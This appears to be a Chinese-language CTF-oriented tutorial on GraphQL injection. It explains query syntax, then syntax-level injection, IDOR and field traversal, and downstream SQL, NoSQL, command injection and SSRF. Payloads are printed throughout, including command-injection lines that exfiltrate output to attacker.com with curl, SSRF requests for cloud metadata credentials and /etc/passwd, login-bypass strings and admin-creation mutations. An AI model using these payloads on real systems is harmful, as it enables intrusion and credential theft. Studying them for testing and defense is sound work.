GraphQL 注入

2026/11/17 web安全 GraphQL注入 API CTF

GraphQL之前做题的时候遇到了，但是没有深究，最近新生赛出了相关的题正好研究研究

什么是GraphQL

GraphQL 是一种API 查询语言，核心思想是客户端按需声明想要哪些字段的数据，后端按请求返回对应内容，不像 REST 那样接口返回固定结构。

它靠一套类型系统（Type，包含标量、对象类型，配合类型修饰符控制必填 / 数组）定义数据模型；

通过 Schema 定义根操作：query（查询）、mutation（修改）、subscription（订阅推送）；

再由 Resolver 解析函数负责实际取数，递归解析查询直到标量类型，Resolver 内部可以对接 SQL、REST、RPC 等任意数据源，实现前后端解耦。

基础知识

一、3 种操作（Operation）

  • Query：读数据，只读不改，支持嵌套查询、变量，按需指定返回字段

  • Mutation：写数据（增 / 删 / 改），变更服务端状态，执行后也可指定返回字段

  • Subscription：实时订阅，基于 WebSocket 长连接，服务端主动推送更新

它们都走同一个端点（通常是 /graphql），通过请求体里的关键字区分。

# 1. query：读数据
query { ... }

# 简写：只有一个 query、无变量时可以省略 query 关键字
{
  user(id: 1) { name }
}

# 2. mutation：写数据（增删改）
mutation { ... }

# 3. subscription：订阅，websocket 实时推送
subscription { ... }

Schema 三件套：Type（数据模型）→ Field（字段）→ Resolver（取值函数，函数签名 (parent, args, ctx, info)）。

二、基础查询 + 嵌套（越权漏洞根源）

query {
  user(id: 1) {        # user 是字段，(id:1) 是参数
    name
    adminInfo {        # 嵌套对象，继续选字段
      permissions
    }
  }
}

返回的 JSON 结构和你写的字段结构一模一样。
漏洞根源：字段只要在 schema 里存在就能请求，服务端常只校验“字段存不存在”，不校验“当前用户有没有权限看”，于是把 adminInfo / password / token 这类字段直接加进查询就能拖出来。

三、变量 $

query GetUser($uid: ID!) {
  user(id: $uid) {
    name
  }
}

// variables
{ "uid": "1" }

! = 非空，必填。
参数与 body 分离，payload 藏在 variables 里，可绕过只查 query 字符串的关键字过滤。

四、别名 alias（绕过简单关键字检测）

query {
  u1: user(id: 1) { name }
  u2: user(id: 2) { name }
}
  • 同一字段一次请求可查多次，靠别名区分响应 key
  • 别名随便起，天然绕过基于字段名的黑名单 / WAF
  • 批量越权：一条请求把 id 1~100 全拖出来

五、片段 fragment（长查询复用）

fragment UserBase on User {
  id
  name
}

query {
  user(id: 1) {
    ...UserBase
    email
  }
}



# 效果相同
query { user(id:1) { id name email } }
  • ... 展开片段
  • 很多简易权限校验不会递归解析片段，容易绕过
  • 内联写法：... on User { name }

六、Schema 类型定义（后端定义）

内置标量：ID / String / Int / Float / Boolean

type User {
  id: ID!
  name: String!
  email: String
}

type Query {
  user(id: ID!): User
}

type Mutation {
  createUser(name: String!): User
}

# 列表 []
type Post {
  comments: [Comment!]!
}

# input 输入类型，mutation 传参用
input UserInput {
  name: String
}
  • ! 非空；[Comment!]! = 列表非空 + 元素都非空
  • type 是输出类型，input 是输入类型，mutation 传参用 input

七、指令 @

query {
  user(id: 1) {
    name  @include(if: true)
    email @skip(if: false)
  }
}
  • @include(if: 布尔)：true 才返回此字段
  • @skip(if: 布尔)：true 跳过此字段

注：原文写成 @//include/ 是被转义过，实际语法就是 @include。

八、注释

# 开头，单行注释（# 后到行尾全部忽略）。

九、类型修饰符

  • Type!：该字段不可为空
  • [Type]：列表可空、元素可空
  • [Type!]：列表可空、元素必填
  • [Type!]!：列表本身、内部元素都必填

! 紧贴谁，谁非空

十、内省系统

GraphQL 可以查询自身 Schema

  • __typename：获取当前对象类型名
  • __schema：查询完整 Schema
  • __type(name)：按名称查询单个类型结构

GraphQL注入

大致分为这三条利用路线

线 名称 注入发生在 本质 危害
A 语法层注入（GraphQL Injection 严格定义） query 字符串拼接处 闭合语法、追加操作 执行非预期 query/mutation
B 结构层注入（字段遍历/越权） 客户端可控的字段选择 绕过字段级鉴权 批量拖敏感字段、IDOR
C 下游注入（resolver 内部） Resolver 把参数丢给 SQL/命令/URL 传统漏洞在 GraphQL 外壳下 SQLi / NoSQLi / RCE / SSRF

三者的共同前提都是：GraphQL 只有一个入口，攻击者能用一条请求表达任意结构。差别只在于“哪一层没做校验”。

A线 语法层注入（严格意义的 GraphQL Injection）

原理

PHP/Java/Node 里把用户输入字符串拼接进 query 模板：

query = 'query { user(name: "%s") { name email } }' % name

GraphQL 解析器按语法切分，攻击者输入里的 "``)``} 会闭合当前结构，剩下部分被当作新的操作解析。用 # 注释掉尾部残留。

响应里可能同时返回 data 和 errors —— 只要 data 里有东西，说明注入成功。

闭合手法

原始模板：

query { getscorebyyourname(name:"<INJECT>") { score name } }

① 闭合 + 追加查询

xxx") { score name } } query { __schema { types { name } } } #

② 闭合 + 追加 mutation

可以直接写库

xxx") { score name } } mutation { deleteUser(id:1){ ok } } #

③ 只用单引号闭合

模板用单引号时

xxx'){ id name } } #

④ 注释符差异

GraphQL 只有 # 一种注释（-- 和 /* */ 无效）；URL 传参时 # 要编码成 %23。

完整的可复用模板

{"query":"query { user(id: \"1\") { name email } }"}

注入 id 值：

{"query":"query { user(id: \"1\") { name email } } query { __schema { types { name } } } #\") { name email } }"}
适用条件
  1. 后端存在 字符串拼接构造 query 的代码（模板 "%s" / + / f-string）
  2. 拼接位置在 参数值引号内部（能闭合引号）
  3. 解析器没有对整条 query 做语法白名单校验
  4. 目标服务允许一次请求执行多个操作（operationName 未强制 / 未开 NoUnusedFragments 等校验规则）

为什么参数化能防住 A 线

  • 字符串拼接：用户输入 → 拼入源码 → 整体 Parser 解析 → 输入能改 AST，注入生效

  • Variables 参数化：固定源码先 Parser 生成 AST → 再填充变量字面量 → 变量内容不进 Parser，无法修改 AST 结构，直接阻断 GraphQL Injection

例子

// 固定的查询文档（写死，用户不能篡改这段结构）
query GetUser($id: ID!) { 
  user(id: $id) { name email } 
}

用户输入：

{
  "query": "query GetUser($id: ID!){ user(id: $id) { name email } }",
  "variables": {
    "id": "123\") { deleteUser } #"
  }
}

攻击者给的变量：123") { deleteUser } #

流程：

  • Parser 只处理 query 字段内的文本，不读取 variables。

    解析结果：声明变量 $id: ID!，执行 user(id: $id)，选取 name、email。 生成并锁定 AST

  • AST 定型之后才把变量值填充进占位符。 $id 被替换为字面量字符串："123\") { deleteUser } #"

    关键点：填充的只是字符串值，不是 GraphQL 源码，不会再次交给 Parser 语法解析。 Resolver 获取到的 args.id 就是原字符串 123") { deleteUser } #，里面的 ")、{、# 只是普通字符，不具备语法含义。

变量值在解析后才注入，永远作为字面量字符串处理，不参与语法解析。所以 variables 是 A 线的根治手段。

B 线：结构层注入（字段遍历 / 越权 / IDOR）

  • 结构层注入 ：利用 GraphQL 客户端可控选择集的特性，主动挑选敏感字段、嵌套关联；

  • 请求语法完全合法，漏洞根源是缺少字段级、resolver 级别权限校验。

  • 区分：A 线是改源码语法；结构注入是正常语法下滥用查询结构。

原理

GraphQL 把“我要哪些字段”的决定权交给客户端，而 schema 本身就是公开的数据地图（内省可全量导出）。服务端若只在网关/顶层字段做一次鉴权：

  • 换更深的字段（user.posts.comments.author.email）→ 走另一条 resolver，可能没校验
  • 换对象 id（user(id:1) → user(id:2)）→ 没做归属校验就是 IDOR
  • 换UI 从没用过的字段（passwordHash、internalNotes）→ 没人测过
  • 用别名一次要 100 个对象 → 一请求拖全库
schema 是一张公开地图 ──┐
                        ├─ 客户端自由选路径
resolver 只在入口设关卡 ─┘        ↓
                        绕开关卡走小路 = 越权

字段遍历

场景 1

publicPost 顶层放行，author 关联无校验

query {
  publicPost(id:1){
    title
    author {
      id name email
      privateMessages { content }
    }
  }
}
场景 2

深层链式嵌套穿透，一层一层跳到其他用户敏感数据

query {
  user(id:1){
    name
    posts {
      content
      comments {
        text
        author { email password }
      }
    }
  }
}

未授权 / IDOR

直接指定 ID 查询任意用户，缺少归属校验：

{ user(id:2){ name email phone } }

特点：前端页面不请求敏感字段不代表后端不返回；内省可枚举全部敏感字段。

（真实场景：内省列出全部 email，正常查询 401，但某个漏鉴权的字段/操作可未授权返回全站邮箱 + 密码哈希）

敏感字段直取

规则：字段在 schema 里存在（内省可见），但 UI 从不请求

原理：GraphQL 的返回值由客户端选择性集决定，服务端不做“字段级白名单”。只要 schema 里声明了 passwordHash，哪怕前端从不请求，它也是可查询的——除非该字段的 resolver 单独实现了权限拒绝。很多系统把“前端不显示”误当成“接口不返回”。

query {
  user(id: 1) {
    id
    name
    email
    phone
    passwordHash
    internalNotes
    paymentInfo
    apiKey
  }
}
批量导出（单对象 → 列表）
query {
  users(limit: 1000) {
    id
    name
    email
    passwordHash
  }
}

别名批量拖库 + 绕限流 / WAF

单请求多个别名批量拉取多条数据，只消耗一次 HTTP 请求计数：

query {
  u1: user(id: 1)  { name email }
  u2: user(id: 2)  { name email }
  u3: user(id: 3)  { name email }
  u4: user(id: 4)  { name email }
  u5: user(id: 5)  { name email }
}
极短别名
query {
  a: user(id: 1) { email }
  b: user(id: 2) { email }
  c: user(id: 3) { email }
}

要点：短别名 a: b: c: 规避简单关键词、长度检测；经典案例 GitHub 2020 GraphQL 限流绕过。

Mutation 写操作越权、垂直提权

篡改他人信息：
mutation {
  updateUser(id:1, email:"attacker@evil.com"){ id email }
}
创建管理员账号（入参未过滤权限字段）：
mutation {
  createUser(name:"test", email:"t@t.com", role:"ADMIN"){ id role }
}
批量删除:
mutation {
  deleteUser(id: 1) { ok }
}

提权常用：updateUser / updateProfile 里带 role、isAdmin、verified 参数。

废弃字段专项

规则：内省显示 isDeprecated: true

原理：@deprecated 只影响文档与 IDE 提示，不影响可查询性。废弃字段通常是第一版接口，鉴权和校验都停留在早期实现，后续加了权限体系却没回头补——是整个 schema 里权限覆盖率最低的区域。

枚举废弃字段 payload
query {
  __type(name: "User") {
    fields(includeDeprecated: true) {
      name
      isDeprecated
      deprecationReason
      type { name }
    }
  }
}

默认内省查询不会返回废弃字段，必须带上 includeDeprecated: true。

利用示例

枚举拿到废弃字段名后直接请求：

query {
  user(id: 1) {
    oldPassword
    legacyToken
    internalFlag
  }
}
拓展测试思路
  • 废弃字段 + IDOR：user(id:任意id) { oldPassword }
  • 废弃字段 + 横向穿透：在嵌套关联对象里找废弃敏感字段
query {
  publicPost(id:1) {
    author {
      oldPassword
      legacyToken
    }
  }
}
  • 废弃 Mutation：同样可以用内省枚举废弃 mutation，往往存在提权、写入越权
query {
  __schema {
    mutationType {
      fields(includeDeprecated:true) {
        name
        isDeprecated
      }
    }
  }
}

适用条件

  1. 生产环境开启内省，或可通过盲猜 / 爆破重建 Schema
  2. 鉴权放在网关、顶层根 resolver，嵌套对象不做二次鉴权
  3. Schema 存在关联字段：author / owner / parent / postedBy，形成越权链路
  4. Schema 定义了敏感字段，前端业务没有使用该字段

C 线：下游注入

核心一句话：GraphQL 只做类型校验，不负责内容安全；注入不在 GraphQL 本身，在 resolver 下游的业务代码。

前置判断：参数类型为 String / 自定义标量 / JSON / InputObject；Int/Boolean 基本很难利用。

SQL 注入

触发条件：参数直接字符串拼接进 SQL，没有预编译

直接 payload
query {
  users(filter: "1' OR '1'='1") {
    id name password
  }
}
变量形式（规避 waf 检测 query 文本）
query GetUsers($f: String) {
  users(filter: $f) { id name }
}

{
  "query": "query GetUsers($f: String) { users(filter: $f) { id name } }",
  "variables": {
    "f": "' OR '1'='1' -- "
  }
}

登录认证绕过

query Login($u: String!, $p: String!) {
  login(username: $u, password: $p) {
    token user { id role }
  }
}

{
  "variables": {
    "u": "admin' -- ",
    "p": "anything"
  }
}
HITCTF2018 BabyQuery（Base32 包装 SQLi 样例）

重点：编码只是传输壳，解码后原样拼接 SQL，编码≠防护

目标字段：getscorebyyourname(name)

payload 模板

query {
  getscorebyyourname(name: "<B32>") {
    score name
  }
}

Python 编码脚本

import base64
import sys
sql = sys.argv[1]
print(base64.b32encode(sql.encode()).decode())

python b32.py "1' union select sqlite_version()-- "

NoSQL 注入

触发条件：参数直接传入 Mongo 查询对象，类型是 JSON/InputObject

布尔绕过登录
query Login($u: JSON, $p: JSON) {
  login(username: $u, password: $p) {
    token user { id role }
  }
}

{
  "variables": {
    "u": {"$ne": null},
    "p": {"$ne": null}
  }
}
正则盲注
{
  "variables": {
    "u": {"$regex": "^admin"},
    "p": {"$ne": null}
  }
}
类型不匹配的绕法

若 users 直接收对象

query {
  users(filter: { username: { $ne: null } }) {
    id username password
  }
}

命令注入

触发条件：resolver 调用exec/subprocess/system，拼接host/ip/文件名等参数

基础回显
mutation {
  pingHost(host: "127.0.0.1; id") {
    output status
  }
}
无回显外带
mutation {
  pingHost(host: "127.0.0.1; curl http://attacker.com/$(whoami)") {
    status
  }
}
文件处理场景
mutation {
  convertImage(url: "x.jpg; curl http://attacker.com/`id`") {
    status
  }
}

SSRF

触发条件：服务端发起 HTTP 请求，无 IP / 协议白名单

云元数据
mutation {
  importFromUrl(url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/") {
    content
  }
}
内网探测
query {
  fetchPreview(url: "http://127.0.0.1:6379") {
    body status
  }
}
协议绕过（file:// / gopher:// / dict://）
query {
  fetchPreview(url: "file:///etc/passwd") {
    body
  }
